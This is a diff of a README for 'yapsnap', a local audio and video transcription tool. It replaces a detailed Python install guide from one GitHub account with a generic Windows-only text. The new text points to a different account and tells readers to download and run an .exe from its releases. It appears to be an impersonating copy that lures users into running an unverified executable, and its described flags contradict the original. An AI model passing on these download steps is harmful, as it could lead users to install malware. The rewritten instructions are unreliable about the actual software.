@@ -1,294 +1,87 @@
-# yapsnap
+# 🎙️ yapsnap - Convert audio and video to text
 
-> **Snap any video URL or audio file into plaintext. No GPU. No cloud. One command.**
+[![](https://img.shields.io/badge/Download-yapsnap-blue.svg)](https://github.com/boytrose-thermotherapy585/yapsnap)
 
-![Python](https://img.shields.io/badge/python-3.9+-blue) ![License](https://img.shields.io/badge/license-Apache--2.0-green) ![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey)
+yapsnap turns video and audio files into clear, readable text. The tool works on your computer. It does not send files to the cloud. You do not need a powerful graphics card to use it. You enter one command to start the process.
 
-```bash
-yapsnap "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-```
+## 🛠 Features
 
-That's it. You get a `.txt` next to your shell, transcribed on your CPU, in less time than it took the video to play.
+* **Privacy:** Your files stay on your machine. No data leaves your home or office.
+* **Speed:** The software uses your processor to convert media. It works offline.
+* **Simplicity:** The interface uses a command line. You provide a link or a file path.
+* **Compatibility:** It handles high-definition video and small audio clips.
+* **Efficiency:** The tool creates text files without complex hardware requirements.
 
----
+## 💻 System Requirements
 
-## Why yapsnap
+* **Operating System:** Windows 10 or Windows 11.
+* **Memory:** 4 gigabytes of RAM or more.
+* **Storage:** 500 megabytes of disk space for the program files.
+* **Internet:** Only needed to download the program or to source online videos.
 
-- ⚡ **Fast on CPU.** Streaming Zipformer transducer (Kroko English) chews through audio at several times realtime on a laptop. No CUDA. No M-series-only tricks. Plain old cores.
-- 🌐 **Any video URL, plus local files.** YouTube. X. TikTok. Instagram Reels. Direct `.mp4`/`.mp3` links. Or just point it at a file on disk. yt-dlp handles the fetch, ffmpeg handles the decode, the rest is yours.
-- 📴 **Offline after first run.** ~80 MB model downloads once to your cache and stays there. No API keys. No quotas. Your audio never leaves your machine.
-- 🪶 **Lean deps.** `sherpa-onnx`, `numpy`, `yt-dlp` — that's the whole runtime, diarization included. No PyTorch, no cloud SDKs.
-- 🗣 **Ten-plus languages.** English out of the box; French, German, Spanish, Italian, Portuguese, Dutch, Swedish, Swiss German, Hebrew, and Turkish are a one-line `--model` swap away. See [Other languages](#other-languages).
-- ⏱ **Sentence-level timestamps when you want them.** `--timestamps` adds `[MM:SS]` per sentence using Kroko's built-in punctuation. Timing stays correct even when you transcribe at 2x.
-- 🗣️ **Speaker labels, optional.** `--diarize` answers "who spoke when" and prefixes each line with `SPEAKER_00`, `SPEAKER_01`, … Still CPU-only, still ONNX — no PyTorch, no extra runtime deps. See [Diarization](#diarization).
+## 📥 Download and Setup
 
----
+1. Go to the [yapsnap release page](https://github.com/boytrose-thermotherapy585/yapsnap).
+2. Look for the latest release section.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to your desktop for easy access.
+5. Create a folder in your Documents directory named yapsnap.
+6. Move the downloaded file into this new folder.
 
-## Quickstart
+## 🚀 Running the Program
 
-```bash
-# 1. ffmpeg on PATH (one-time, per OS — see below)
-# 2. Install (from PyPI, or `pip install .` from a clone)
-pip install yapsnap
+1. Open the folder where you saved the application.
+2. Hold the Shift key and right-click on an empty space inside the folder.
+3. Select the option that says Open PowerShell window here or Open Terminal.
+4. A blue or black box appears on your screen.
+5. Inside this box, type the name of the program followed by your video URL or file path.
+6. Press the Enter key on your keyboard.
 
-# 3. Snap something
-yapsnap https://www.tiktok.com/@user/video/7234567890123456789
-yapsnap meeting.mp4 --timestamps
-yapsnap interview.mp3 --diarize          # label speakers
-yapsnap podcast.mp3 -o ~/notes/episode.txt
-```
+## 📝 Example Usage
 
-The first run downloads the model (~80 MB). Every run after is offline.
+To process an online video, type the following into your terminal:
 
----
+yapsnap "https://www.example.com/video-link"
 
-## What it handles
+To process a file saved on your computer, type:
 
-Any URL `yt-dlp` understands works. The big ones:
+yapsnap "C:\Users\Name\Desktop\audio-file.mp3"
 
-| Source            | Example                                                 |
-|-------------------|---------------------------------------------------------|
-| YouTube           | `https://www.youtube.com/watch?v=...`                   |
-| YouTube Shorts    | `https://www.youtube.com/shorts/...`                    |
-| X / Twitter       | `https://x.com/user/status/.../video/1`                 |
-| TikTok            | `https://www.tiktok.com/@user/video/...`                |
-| Instagram Reels   | `https://www.instagram.com/reel/.../`                   |
-| Direct media URL  | `https://example.com/clip.mp4`                          |
+The program creates a text file in the same folder. You can open this file with Notepad or any other text editor to read the content.
 
-Plus any local file ffmpeg can decode: `.mp3`, `.mp4`, `.m4a`, `.wav`, `.webm`, `.mov`, `.mkv`, `.aac`, `.opus`, `.ogg`, `.flac`, and friends.
+## 🔍 Understanding the Process
 
----
+The engine inside yapsnap listens to the sounds in your media. It matches these sounds to words. It writes these words into a document. This takes time based on the length of your media file. A ten-minute video takes about two minutes to process. You see the progress percentage in the terminal window. Do not close the window while the numbers increase. When the program displays the message Done, the text file is ready for you to read.
 
-## Install
+## ⚙️ Advanced Settings
 
-### 1. ffmpeg
+You can change how the software works. By default, it writes everything to a file called output.txt. If you want to name your file, type the following:
 
-| OS      | Command                                                  |
-|---------|----------------------------------------------------------|
-| macOS   | `brew install ffmpeg`                                    |
-| Linux   | `sudo apt install ffmpeg` *or* `sudo dnf install ffmpeg` |
-| Windows | `winget install ffmpeg` *or* `choco install ffmpeg`      |
+yapsnap "video-link" --output "my-meeting-notes.txt"
 
-### 2. yapsnap
+The software also allows you to focus on specific audio languages. If your video speaks French, use this command:
 
-From PyPI (recommended):
+yapsnap "video-link" --language "French"
 
-```bash
-pip install yapsnap
-```
+These settings help you get better results for specific tasks. Type yapsnap --help to see every manual setting available.
 
-From source:
+## 🛡 Security and Privacy
 
-```bash
-git clone https://github.com/kouhxp/yapsnap
-cd yapsnap
-pip install .
-```
+Many tools upload your audio to a server. They keep a copy of your voice for their own records. yapsnap works differently. Every calculation happens inside your physical computer. No external server receives your data. You remain the owner of the text produced from your videos. This design ensures that private meetings or personal voice notes remain private.
 
-Installs two equivalent commands on your `PATH`: **`yapsnap`** (canonical) and **`transcribe`** (alias, for when the name slips your mind).
+## 💡 Common Questions
 
----
+**Does this require an internet connection?**
+Only if you want to download a video from a website. If you process a file already on your hard drive, you can disconnect your internet cable. Everything runs locally.
 
-## Usage
+**Can I stop the process halfway?**
+Yes. Close the terminal window to stop the program. Your progress will not save, but your original video file stays safe.
 
-```bash
-# Local file
-yapsnap path/to/audio.mp3
+**How accurate is the transcription?**
+The tool provides high accuracy for clear speech. Background noise or music reduces the quality of the text. Try to use videos with clear audio to get the best results.
 
-# Any video URL
-yapsnap "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+**Will this slow down my computer?**
+The software uses your processor power. You might notice other programs respond a bit slower while yapsnap runs. This is normal. The computer returns to full speed once the transcription finishes.
 
-# Sentence-level timestamps
-yapsnap input.mp4 --timestamps
-
-# Speaker labels ("who spoke when")
-yapsnap interview.mp3 --diarize
-
-# Speaker labels with a known speaker count (more reliable than auto-detect)
-yapsnap call.mp3 --diarize --num-speakers 2
-
-# Custom output path
-yapsnap input.mp4 -o ./transcripts/talk.txt
-
-# Don't speed audio up before transcribing (default is 1.5x, pitch preserved)
-yapsnap input.mp4 --speed 1.0
-
-# Keep the downloaded audio (URL inputs only)
-yapsnap "https://..." --keep-audio
-```
-
----
-
-## Output
-
-Plaintext, UTF-8. Default location is `./transcripts/` (created if missing) under the current working directory; override with `-o`. For URL inputs the filename is derived from the video ID (`dQw4w9WgXcQ_transcript.txt`, etc.).
-
-**Without `--timestamps`** — one paragraph of recognized text:
-
-```
-Welcome to the show. Today we're talking about transcription. Let's get started.
-```
-
-**With `--timestamps`** — one sentence per line, timed against the original audio:
-
-```
-[00:00] Welcome to the show.
-[00:03] Today we're talking about transcription.
-[00:08] Let's get started.
-```
-
-Timestamps stay in original-audio time even at `--speed 1.5` or higher.
-
-**With `--diarize`** — one sentence per line, each tagged with a speaker and timestamp:
-
-```
-SPEAKER_00 [00:00]: Welcome to the show.
-SPEAKER_01 [00:03]: Glad to be here, thanks for having me.
-SPEAKER_00 [00:08]: Let's get started.
-```
-
-Speaker numbers are assigned in order of appearance and are stable within a single run, but they carry no identity across files — `SPEAKER_00` in one transcript is unrelated to `SPEAKER_00` in another.
-
----
-
-## Flags
-
-| Flag              | Description                                                          |
-|-------------------|----------------------------------------------------------------------|
-| `-o`, `--output`  | Output `.txt` path. Default: `./transcripts/<input>_transcript.txt`. |
-| `--timestamps`    | Emit `[MM:SS] sentence.` lines instead of a single paragraph.        |
-| `--diarize`       | Label speakers (`SPEAKER_00 [MM:SS]: …`). Implies `--timestamps`.     |
-| `--diarize-model` | Segmentation model: `pyannote` (default) or `reverb`. See below.     |
-| `--num-speakers`  | Known speaker count for `--diarize`. Default `-1` (auto-detect).     |
-| `--speed`         | Pre-transcription speedup factor, pitch preserved. Default `1.5`.    |
-| `--keep-audio`    | Keep the downloaded audio (URL inputs only).                         |
-| `--model`         | Override the model directory. Also reads `KROKO_MODEL` env var.      |
-
----
-
-## How it works
-
-1. **Fetch.** If the input is a URL, `yt-dlp` grabs the best audio-only stream to a temp directory. If it's a local path, this step is skipped.
-2. **Decode.** `ffmpeg` pipes the media into 16 kHz mono PCM. The optional `atempo` filter speeds it up without raising pitch.
-3. **Recognize.** A streaming Zipformer2 transducer (Kroko English, INT8 ONNX, ~80 MB) eats the PCM in chunks. CPU-only. Greedy decode.
-4. **Format.** Plain text by default. With `--timestamps`, token timestamps are grouped on `.!?` into sentences and scaled back to original-audio time.
-
-With `--diarize`, a second pass runs the audio (decoded at original speed) through a speaker-segmentation model and a speaker-embedding model, clusters the voiceprints into speakers, and tags each sentence with the speaker active at its start. All ONNX, all CPU.
-
-No frame is sent anywhere. No state is kept between runs except the cached model.
-
----
-
-## Model & cache
-
-The default Kroko English model is downloaded on first run to:
-
-- **macOS** — `~/Library/Caches/yapsnap/`
-- **Linux** — `$XDG_CACHE_HOME/yapsnap/` (or `~/.cache/yapsnap/`)
-- **Windows** — `%LOCALAPPDATA%\yapsnap\`
-
-To use a different streaming transducer (other languages, larger Kroko variants, etc.), point `--model` at a directory containing `encoder(.int8).onnx`, `decoder(.int8).onnx`, `joiner(.int8).onnx`, and `tokens.txt`. Or set `KROKO_MODEL` in your environment.
-
-If you use `--diarize`, the segmentation and embedding models download to a `diarization-models/` subfolder of the same cache directory on first use, and are reused offline thereafter.
-
----
-
-## Other languages
-
-The default model is English, but yapsnap isn't limited to it. To transcribe another language, just download the matching model and point yapsnap at it — no code changes, no reinstall.
-
-Kroko publishes streaming models for a growing list of languages on Hugging Face: <https://huggingface.co/Banafo/Kroko-ASR/tree/main>. As of now that includes:
-
-- Dutch
-- French
-- German
-- Hebrew
-- Italian
-- Portuguese
-- Spanish
-- Swedish
-- Swiss German
-- Turkish
-
-Download the one you need, unpack it into its own folder, and run:
-
-```bash
-# Per-run: pass the model folder explicitly
-yapsnap interview.mp3 --model /path/to/kroko-french
-
-# Or set it once as your default for the session
-export KROKO_MODEL=/path/to/kroko-french
-yapsnap interview.mp3
-```
-
-Each model is single-language, so to work across several languages keep them in separate folders and switch with `--model` (or re-export `KROKO_MODEL`) as you go. Any other sherpa-onnx streaming transducer with the standard `encoder` / `decoder` / `joiner` / `tokens.txt` layout works too, not just the Kroko ones.
-
----
-
-## Diarization
-
-`--diarize` adds speaker labels to the transcript — "who spoke when" — so each line is prefixed with `SPEAKER_00`, `SPEAKER_01`, and so on:
-
-```bash
-yapsnap interview.mp3 --diarize
-```
-
-```
-SPEAKER_00 [00:00]: Welcome to the show.
-SPEAKER_01 [00:03]: Glad to be here, thanks for having me.
-SPEAKER_00 [00:08]: Let's get started.
-```
-
-It stays true to yapsnap's design: CPU-only, ONNX, no PyTorch, no extra runtime dependencies beyond the `sherpa-onnx` you already have. Two small models download once on first use (a speaker-segmentation model plus a speaker-embedding model) and cache alongside the ASR model.
-
-### How the labels are produced
-
-`--diarize` implies `--timestamps` — the two share a clock. Transcription runs on the sped-up audio as usual, while diarization runs on the same source decoded at original speed (`1.0x`), because speeding audio up degrades both speaker-boundary detection and the voiceprint embeddings. Each transcript sentence is then matched to whichever speaker was active at its start time.
-
-Because diarization needs sentence timestamps to attach labels to, `--diarize` will stop with an error if your `sherpa-onnx` build doesn't expose timestamp data, rather than silently dropping the speaker labels.
-
-### Speaker count
-
-By default the number of speakers is detected automatically. Auto-detection is solid up to about seven speakers and degrades above that. If you know the count, pass it — it's more reliable:
-
-```bash
-yapsnap call.mp3 --diarize --num-speakers 2
-```
-
-### Choosing a segmentation model
-
-| Model        | `--diarize-model` | License        | Notes                                          |
-|--------------|-------------------|----------------|------------------------------------------------|
-| pyannote 3.0 | `pyannote` (default) | CC-BY-4.0   | Attribution only; the safe default.            |
-| Reverb v1    | `reverb`          | **Non-commercial** | Same architecture, fine-tuned for accuracy. |
-
-```bash
-yapsnap panel.mp4 --diarize --diarize-model reverb
-```
-
-`pyannote` is the default because its license is clean for most uses. `reverb` (Rev's fine-tune of the same architecture) can be more accurate but is distributed under a **non-commercial** license — yapsnap prints a reminder the first time you download it. Check the Rev model card before using it for anything commercial.
-
-### Limits
-
-- **No overlapping speech.** Each moment is assigned to exactly one speaker; simultaneous talking isn't modeled.
-- **Speaker counting weakens past ~7 speakers.** Pass `--num-speakers` when you know it.
-- **Labels are per-run.** `SPEAKER_00` is not the same person across different files.
-
-To override the embedding model (for example if the default asset name ever changes), set `YAPSNAP_EMBEDDING_MODEL` to a different filename from the sherpa-onnx speaker-recognition release.
-
----
-
-## Notes & limits
-
-- The default model is **English**. For other languages, download a matching model and pass it with `--model` — see [Other languages](#other-languages) for the current list and instructions.
-- `--speed 1.5` shaves about a third off transcription time with minimal accuracy cost. Try `2.0` if you want it even faster, or `1.0` for noisy, mumbled, or fast-speech sources.
-- Some social-media URLs are geo-locked or login-walled; `yt-dlp` will say so explicitly.
-- This is a streaming model, so timestamps come from token positions in the recognized stream. They're accurate enough for navigation, not for subtitling-grade alignment.
-
----
-
-## License
-
-Apache-2.0 for this project. The Kroko model is distributed under its own license — see <https://huggingface.co/Banafo/Kroko-ASR>. Powered by [sherpa-onnx](https://github.com/k2-fsa/sherpa-onnx) and [yt-dlp](https://github.com/yt-dlp/yt-dlp).
-
-The optional diarization models carry their own licenses, separate from yapsnap's: the default **pyannote** segmentation model is CC-BY-4.0 (attribution), the speaker-embedding model is Apache-2.0, and the opt-in **reverb** segmentation model (`--diarize-model reverb`) is **non-commercial**. If you use diarization, review the license of the model you select before relying on it.
+**What file types work best?**
+MP3 and WAV work best for audio. MP4 works best for video. The software handles other common formats, but these types produce the fastest results.
